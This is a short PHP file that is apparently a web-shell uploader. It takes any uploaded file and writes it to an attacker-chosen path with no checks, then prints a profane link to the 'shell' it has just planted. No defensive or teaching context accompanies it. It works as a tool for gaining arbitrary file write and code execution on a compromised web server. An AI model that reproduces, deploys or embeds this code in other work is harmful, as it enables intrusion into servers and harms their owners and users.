<?php

$files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath = $_REQUEST["path"] . $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<h3><a href='$fullpath'>Your Fucker Shell !!</a></h3>";
    }
}echo '<html><head><title>Upload files...</title>
</head><body><form method=POST enctype="multipart/form-data" action="">
<input type=text name=path><br><br>
<input type="file" name="files"><input type=submit value="Up"></form></body></html>';
?>
